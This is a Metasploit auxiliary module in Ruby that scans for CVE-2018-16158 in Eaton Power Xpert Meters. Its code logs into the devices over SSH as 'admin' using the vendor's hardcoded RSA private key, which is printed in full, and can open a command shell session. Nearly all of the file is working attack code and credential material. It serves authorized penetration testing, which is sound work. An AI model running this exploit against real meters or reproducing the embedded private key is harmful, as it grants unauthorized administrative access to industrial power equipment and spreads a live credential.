##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
###

# XXX: This shouldn't be necessary but is now
require 'net/ssh/command_stream'

class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::SSH
  include Msf::Auxiliary::Scanner
  include Msf::Auxiliary::CommandShell
  include Msf::Auxiliary::Report

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'Eaton Xpert Meter SSH Private Key Exposure Scanner',
      'Description'    => %q{
        Eaton Power Xpert Meters running firmware below version 12.x.x.x or
        below version 13.3.x.x ship with a public/private key pair that
        facilitate remote administrative access to the devices.
        Tested on: Firmware 12.1.9.1 and 13.3.2.10.
      },
      'Author'         => [
        'BrianWGray'
      ],
      'References'     => [
        ['CVE', '2018-16158'],
        ['EDB', '45283'],
        ['URL', 'http://www.eaton.com/content/dam/eaton/company/news-insights/cybersecurity/security-bulletins/PXM-Advisory.pdf'],
        ['URL', 'https://www.ctrlu.net/vuln/0006.html']
      ],
      'DisclosureDate' => 'Jul 18 2018',
      'License'        => MSF_LICENSE
    ))

    register_options([
      Opt::RPORT(22)
    ])

    register_advanced_options([
      OptBool.new('SSH_DEBUG',  [false, 'SSH debugging', false]),
      OptInt.new('SSH_TIMEOUT', [false, 'SSH timeout', 10])
    ])
  end

  def run_host(ip)
    factory = ssh_socket_factory

    # Specified Kex/Encryption downgrade requirements must be set to connect to the Power Meters.
    ssh_opts = {
      auth_methods:    ['publickey'],
      port:            rport,
      key_data:        [ key_data ],
      hmac:            ['hmac-sha1'],
      encryption:      ['aes128-cbc'],
      kex:             ['diffie-hellman-group1-sha1'],
      host_key:        ['ssh-rsa'],
      use_agent:       false,
      config:          false,
      proxy:           factory
    }

    ssh_opts.merge!(verbose: :debug) if datastore['SSH_DEBUG']

    begin
      ssh = Timeout.timeout(datastore['SSH_TIMEOUT']) do
        Net::SSH.start(ip, 'admin', ssh_opts)
      end
    rescue Net::SSH::Exception => e
      vprint_error("#{ip}:#{rport} - #{e.class}: #{e.message}")
      return
    end

    return unless ssh

    print_good("#{ip}:#{rport} - Logged in as admin")

    version = ssh.transport.server_version.version

    report_vuln(
      host: ip,
      name: self.name,
      refs: self.references,
      info: version
    )

    shell = Net::SSH::CommandStream.new(ssh)

    # XXX: Wait for CommandStream to log a channel request failure
    sleep 0.1

    if (e = shell.error)
      print_error("#{ip}:#{rport} - #{e.class}: #{e.message}")
      return
    end

    info = "#{self.name} (#{version})"

    ds_merge = {
      'USERNAME' => 'admin'
    }

    if datastore['CreateSession']
      start_session(self, info, ds_merge, false, shell.lsock)
    end

    # XXX: Ruby segfaults if we don't remove the SSH socket
    remove_socket(ssh.transport.socket)
  end

  def rport
    datastore['RPORT']
  end

  def key_data
    <<EOF
-----BEGIN RSA PRIVATE KEY-----
MIICWwIBAAKBgQCfwugh3Y3mLbxw0q4RZZ5rfK3Qj8t1P81E6sXjhZl7C3FyH4Mj
C15CEzWovoQpRKrPdDaB5fVyuk6w2fKHrvHLmU2jTzq79B7A4JJEBQatAJeoVDgl
TyfL+q6BYAtAeNsho8eP/fMwrT2vhylNJ4BTsJbmdDJMoaaHu/0IB9Z9ywIBIwKB
gQCEX6plM+qaJeVHif3xKFAP6vZq+s0mopQjKO0bmpUczveZEsu983n8O81f7lA/
c2j1CITvSYI6fRyhKZ0RVnCRcaQ8h/grzZNdyyD3FcqDNKO7Xf+bvYySrQXhLeQP
I3jXGQPfBZUicGPcJclA98SBdBI1SReAUls1ZdzDwA3T8wJBAM6j1N3tYhdqal2W
gA1/WSQrFxTt28mFeUC8enGvKLRm1Nnxk/np9qy2L58BvZzCGyHAsZyVZ7Sqtfb3
YzqKMzUCQQDF7GrnrxNXWsIAli/UZscqIovN2ABRa2y8/JYPQAV/KRQ44vet2aaB
trQBK9czk0QLlBfXrKsofBW81+Swiwz/AkEAh8q/FX68zY8Ssod4uGmg+oK3ZYZd
O0kVKop8WVXY65QIN3LdlZm/W42qQ+szdaQgdUQc8d6F+mGNhQj4EIaz7wJAYCJf
z54t9zq2AEjyqP64gi4JY/szWr8mL+hmJKoRTGRo6G49yXhYMGAOSbY1U5CsBZ+z
zyf7XM6ONycIrYVeFQJABB8eqx/R/6Zwi8mVKMAF8lZXZB2dB+UOU12OGgvAHCKh
7izYQtGEgPDbklbvEZ31F7H2o337V6FkXQMFyQQdHA==
-----END RSA PRIVATE KEY-----
EOF
  end
end
